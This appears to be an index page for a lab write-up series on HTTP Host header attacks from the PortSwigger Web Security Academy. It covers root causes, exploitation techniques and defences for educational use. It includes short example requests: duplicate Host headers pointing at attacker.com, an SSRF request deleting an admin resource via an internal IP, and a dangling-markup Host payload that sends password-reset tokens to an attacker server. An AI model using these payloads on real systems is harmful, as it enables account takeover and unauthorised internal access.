---
title: "[PortSwigger] HTTP Host Header Attacks Series"
date: 2026-09-14
description: "Comprehensive analytical guide covering 7 challenges on HTTP Host Header vulnerabilities in PortSwigger Web Security Academy: root cause analysis, deep exploitation tradecraft, and defense-in-depth remediations."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
showAuthor: false
showTableOfContents: true
---

Welcome to the **HTTP Host Header Attacks** series from the **PortSwigger Web Security Academy** writeup collection.

The `Host` header is a mandatory request header in HTTP/1.1 and HTTP/2, originally introduced to support Name-based Virtual Hosting, enabling multiple web domains to reside on a single IP address. However, because the client completely controls this value, a failure to validate it strictly at intermediate proxies or implicit trust by backend applications leads to severe vulnerability chains: **Password Reset Poisoning, Web Cache Poisoning, Routing-based SSRF, Authentication Bypass, and Dangling Markup Injection**.

---

## Series Challenge Index

| Lab | Challenge name | Level | Primary Exploit Technique |
| :---: | :--- | :---: | :--- |
| **01** | [Basic password reset poisoning](lab-01-basic-password-reset-poisoning/) | Apprentice | Poisoning the `Host` header in password reset requests |
| **02** | [Host header authentication bypass](lab-02-host-header-authentication-bypass/) | Apprentice | Spoofing localhost/internal Host to bypass admin access control |
| **03** | [Web cache poisoning via ambiguous requests](lab-03-web-cache-poisoning-via-ambiguous-requests/) | Practitioner | Duplicate Host Header technique poisoning shared Web Cache |
| **04** | [Routing-based SSRF](lab-04-routing-based-ssrf/) | Practitioner | Exploiting misconfigured reverse proxy dynamic routing to probe internal network |
| **05** | [SSRF via flawed request parsing](lab-05-ssrf-via-flawed-request-parsing/) | Practitioner | Parser differential between front-end proxy URL and backend Host routing |
| **06** | [Host validation bypass via connection state attack](lab-06-host-validation-bypass-via-connection-state-attack/) | Practitioner | Exploiting persistent HTTP connections to bypass per-request Host validation |
| **07** | [Password reset poisoning via dangling markup](lab-07-password-reset-poisoning-via-dangling-markup/) | Expert | Exfiltrating reset tokens via unquoted dangling markup injection without user interaction |

---

## Standardized Analysis Framework

Every challenge writeup in this series follows a consistent 4-part structure:
1. **Core Fundamentals**: Protocol mechanics, architectural components, and problem scope.
2. **Attack Architecture**: Data-flow diagrams, trust boundary breakdown, and root causes.
3. **Exploitation & Step-by-Step PoC**: Step-by-step reproduction, request/response dissection in Burp Suite, and PoC delivery.
4. **Remediation Strategies**: Hardening guidelines, server configuration templates, and defensive coding practices.

---

## Root Cause Synthesis

Across the 7 experimental labs, HTTP Host Header vulnerabilities stem from 6 primary architectural flaws:

### 1. Implicit Trust in User-Controlled Input
Developers and web frameworks often assume that the `Host` header represents the legitimate, canonical domain name of the application. Rather than referencing a static server environment variable (e.g., `APP_URL`), applications read directly from `request.getHeader("Host")` to generate redirection links, password reset links, or asset script tags (Labs 1 & 3).

### 2. Architectural Parser Discrepancies
In modern multi-tiered environments, distinct HTTP parsers handle incoming traffic at the front-end reverse proxy and backend application servers, creating differential interpretation:
- **Request-Target Discrepancy**: A front-end proxy validates access based on an absolute URL in the request line (`GET https://target.com/ HTTP/2`), while the backend router resolves the destination via the `Host` header (Lab 5).
- **Duplicate Header Ambiguity**: An intermediary cache server builds its cache key using the first `Host` header, while the backend framework evaluates the second duplicate `Host` header to render HTML responses (Lab 3).

### 3. Dynamic Routing on Unsanitized Host Values
Reverse proxies and load balancers configured to dynamically route upstream requests based on the raw `Host` header string without enforcing an explicit domain whitelist. When supplied with an arbitrary internal IP, the proxy dispatches a TCP connection straight to internal network segments, enabling SSRF (Lab 4).

### 4. Connection-State Assumptions
To optimize throughput, HTTP/1.1 and HTTP/2 maintain persistent TCP connections (Keep-Alive). Defenses that perform security checks solely on the initial request of a connection and treat subsequent requests on the same socket as trusted fail when an attacker sends secondary malicious requests down the authenticated pipeline (Lab 6).

### 5. Permissive Port Parsing
RFC 7230 defines the Host header syntax as `host[:port]`. Many validation engines split the header by colon and validate only the hostname, blindly assuming any remaining characters represent a numeric port without verifying integer constraints. Attackers leverage this to inject raw HTML markup right into the port segment (Lab 7).

### 6. Unencoded Context Reflection
Applications reflecting values extracted from the `Host` header directly into email bodies or rendered HTML templates without HTML entity encoding enable dangling markup attacks and sensitive data leakage (Lab 7).

---

## Attack Methodologies Map

```text
                             HTTP Host Header Attack Taxonomy
                                            │
      ┌────────────────────────┬────────────┴───────────┬────────────────────────┐
      ▼                        ▼                        ▼                        ▼
Password Reset Poisoning   Web Cache Poisoning       Routing-based SSRF      Validation Bypass
  - Direct Injection         - Duplicate Host          - Virtual Host scan     - Absolute URL
  - Dangling Markup          - HTTP/2 Downgrade        - Internal IP Bruteforce- Connection State
```

### 1. Direct Host Header Injection for Token Theft (Lab 1)
- **Tradecraft**: Intercept password reset requests in Burp Suite Repeater, modifying `Host: attacker.com`.
- **Impact**: The application dispatches an email containing `https://attacker.com/reset-password?token=SECRET`. When the user clicks the link, the secret token leaks into attacker access logs, enabling full Account Takeover.

### 2. Internal Authentication Bypass (Lab 2)
- **Tradecraft**: Spoof the `Host` header to `localhost`, `127.0.0.1`, or append headers like `X-Forwarded-For`.
- **Impact**: Bypasses naive perimeter controls that grant administrative access based solely on local hostname verification.

### 3. Web Cache Poisoning with Duplicate Host Headers (Lab 3)
- **Tradecraft**: Exploit parser differences by injecting duplicate `Host` headers:
  ```http
  GET / HTTP/1.1
  Host: target.com
  Host: attacker.com
  ```
- **Impact**: The cache key maps to the legitimate target, but the cached response serves malicious JavaScript imported from the attacker host, triggering persistent stored XSS against all site visitors.

### 4. Routing-based SSRF against Private Subnets (Lab 4)
- **Tradecraft**: Replace `Host` with internal IP addresses (`192.168.0.§1-254§`) and automate discovery via Burp Intruder.
- **Impact**: Forces the reverse proxy to act as an internal gateway, discovering hidden administrative panels and executing sensitive operations behind the firewall.

### 5. Parser Differential with Absolute URLs (Lab 5)
- **Tradecraft**: Supply an absolute URL in the request line while providing an internal target IP in the `Host` header:
  ```http
  GET https://vulnerable-lab.net/admin/delete HTTP/2
  Host: 192.168.0.211
  ```
- **Impact**: Evades front-end access control filters while forcing backend routing to execute unauthorized administrative actions.

### 6. Single-Connection State Exploitation (Lab 6)
- **Tradecraft**: Group requests in Burp Repeater using `Send group (single connection)`:
  - Request 1: Valid host to pass initial front-end security checks.
  - Request 2: Malicious internal host over the exact same established socket.
- **Impact**: Bypasses connection-level validation mechanisms.

### 7. Dangling Markup Injection via Port Segment (Lab 7)
- **Tradecraft**: Inject an unclosed HTML attribute directly into the port segment:
  ```http
  Host: victim-lab.net:'<a href="//attacker-server/?
  ```
- **Impact**: Extracts sensitive reset tokens even if the user never clicks any links; the email client parses the unclosed tag, swallowing all subsequent text up to the next quotation mark and transmitting it to the attacker server.

---

## Defense-in-Depth Mitigation Strategy

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        DEFENSE-IN-DEPTH MATRIX                         │
├───────────────────────────────────┬────────────────────────────────────┤
│     INFRASTRUCTURE & PROXY        │        APPLICATION LOGIC           │
├───────────────────────────────────┼────────────────────────────────────┤
│ • Strict Host whitelist           │ • Use static environment APP_URL   │
│ • Validate port integer format    │ • HTML entity encode reflections   │
│ • Normalize request targets       │ • Short-lived one-time tokens      │
│ • Stateless per-request filtering │ • Internal mTLS / zero-trust       │
│ • Reject duplicate headers        │ • Enforce strict CSP policies      │
└───────────────────────────────────┴────────────────────────────────────┘
```

### 1. Infrastructure & Reverse Proxy Layer
* **Enforce Strict Host Whitelists**: Configure front-end servers (Nginx, Apache, Envoy, Cloudflare) to only accept requests matching a strictly declared list of valid domain names. Unrecognized host headers should immediately receive `400 Bad Request` or `404 Not Found`.
* **Validate Port Formatting**: Ensure port parsers strictly accept numeric integers between 1 and 65535, immediately rejecting any special characters (`<`, `>`, `'`, `"`, spaces).
* **Request Normalization**: Translate absolute-form request lines into origin-form before proxying upstream, ensuring the `Host` header is overridden with the canonical target.
* **Per-Request Stateless Validation**: Never rely on TCP connection persistence to trust subsequent requests. Every individual HTTP message must undergo independent inspection.
* **Reject Duplicate Headers**: Drop or reject any request containing multiple `Host` headers to eliminate cache-poisoning desync vulnerabilities.

### 2. Application Source Code Layer
* **Use Static Configuration Constants**: Never dynamically resolve application hostnames from `request.getHeader("Host")`. Bind canonical URLs to environment variables (`APP_URL=https://example.com`) across all email and link generation routines.
* **HTML Entity Encoding**: Encode all reflected variables before embedding them into templates or email bodies to prevent attribute breakout and dangling markup exploits.
* **Cryptographically Secure Tokens**: Implement high-entropy, short-lived (10–15 minute), single-use tokens for sensitive flows such as password resets.
* **Zero-Trust Internal Access**: Enforce session tokens, API keys, or mTLS for internal microservices rather than assuming LAN traffic is safe.
* **Content Security Policy (CSP)**: Deploy strict CSP directives restricting external frame ancestors, base URIs, and resource load origins.
